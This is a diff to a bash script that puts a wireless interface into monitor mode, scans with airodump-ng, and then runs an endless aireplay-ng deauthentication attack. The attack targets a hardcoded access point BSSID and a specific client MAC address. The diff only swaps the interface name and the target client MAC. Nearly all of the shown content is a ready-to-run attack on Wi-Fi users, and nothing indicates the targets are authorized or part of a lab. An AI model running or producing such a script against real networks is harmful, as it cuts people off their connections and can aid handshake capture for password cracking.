@@ -12,14 +12,14 @@ cleanup() {
 trap cleanup SIGINT
 
 # 1. Put the interface into monitor mode
-echo "[+] Setting wlxe84e0688cc7d to monitor mode..."
-sudo ip link set wlxe84e0688cc7d down
-sudo iw dev wlxe84e0688cc7d set type monitor
-sudo ip link set wlxe84e0688cc7d up
+echo "[+] Setting wlx00c0cabe245c to monitor mode..."
+sudo ip link set wlx00c0cabe245c down
+sudo iw dev wlx00c0cabe245c set type monitor
+sudo ip link set wlx00c0cabe245c up
 
 # 2. Start the initial packet capture
 echo "[+] Starting initial airodump-ng scan. Press [CTRL+C] when you have found your target."
-sudo airodump-ng wlxe84e0688cc7d
+sudo airodump-ng wlx00c0cabe245c
 
 # 3. Wait for user input to proceed and get the channel
 echo ""
@@ -35,10 +35,10 @@ echo "[+] Starting targeted airodump-ng and aireplay-ng deauth attack..."
 echo "[+] Press [CTRL+C] at any time to exit and stop all attacks perfectly."
 
 # Run the targeted airodump-ng in the foreground so you can view it
-sudo airodump-ng -c "$channel_num" --bssid A0:14:3D:A6:F1:D5 wlxe84e0688cc7d
+sudo airodump-ng -c "$channel_num" --bssid A0:14:3D:A6:F1:D5 wlx00c0cabe245c
 
 # Run the deauth attack
-sudo aireplay-ng --deauth 0 -a A0:14:3D:A6:F1:D5 -c FA:A9:9D:CA:00:03 wlxe84e0688cc7d
+sudo aireplay-ng --deauth 0 -a A0:14:3D:A6:F1:D5 -c C6:7A:1A:22:AC:6E wlx00c0cabe245c
 
 
 
